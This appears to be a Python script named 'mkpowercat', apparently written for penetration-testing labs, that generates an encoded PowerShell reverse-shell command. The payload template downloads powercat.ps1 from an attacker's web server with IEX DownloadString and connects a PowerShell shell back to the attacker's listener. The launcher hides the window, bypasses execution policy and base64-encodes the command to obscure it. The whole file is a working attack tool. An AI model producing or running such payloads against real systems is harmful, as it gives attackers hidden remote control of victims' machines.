#!/usr/bin/env python3

"""
Script to generate a base64-encoded powershell payload that tells the victim
to download powercat.ps1 from your webserver and invoke it to your listener.
"""

import argparse
import base64
import fcntl
import socket
import struct
import sys
from ipaddress import ip_address

LPORT = 443
HTTP_PORT = 80

payload_template = """\
IEX(New-Object System.Net.WebClient).DownloadString('http://{lhost}{hport}/powercat.ps1');\
powercat -c {lhost} -p {lport} -e powershell
"""
caller_template = "powershell -nop -noni -ep bypass -w hidden -e {payload}"


# source: https://stackoverflow.com/a/24196955/5202294
def get_ip_address(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(
        s.fileno(),
        0x8915,  # SIOCGIFADDR
        struct.pack("256s", ifname[:15].encode())
    )[20:24])


def portnum(p):
    p = int(p)
    if p > 65535:
        raise argparse.ArgumentTypeError("port number must be <= 65535")
    if p < 1:
        raise argparse.ArgumentTypeError("port number must be > 0")
    return p


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
                    prog='mkpowercat',
                    description='Creates a base64-encoded powershell command to download powercat.ps1 from an attacker and execute it for a reverse shell back to the attacker. Automatically handles conversion to Windows UTF-16LE string encoding.')
    parser.add_argument('-l', '--lhost', type=ip_address, default=get_ip_address("tun0"), help="LHOST, IP address for reverse shell listener.")
    parser.add_argument('-p', '--lport', type=portnum, default=LPORT, help="LPORT for reverse shell listener.")
    parser.add_argument('-H','--http-port', type=portnum, default=HTTP_PORT, help="HTTP server's listening port.")
    args = parser.parse_args()

    hport = "" if args.http_port == 80 else f":{args.http_port}"
    payload = payload_template.format(lhost=args.lhost,lport=args.lport,hport=hport)
    print("[*] base64-encoded payload:", file=sys.stderr)
    print(f"[*] {payload}", file=sys.stderr)
    payload = base64.b64encode(payload.encode("utf-16le")).decode()
    caller = caller_template.format(payload=payload)
    print(caller)

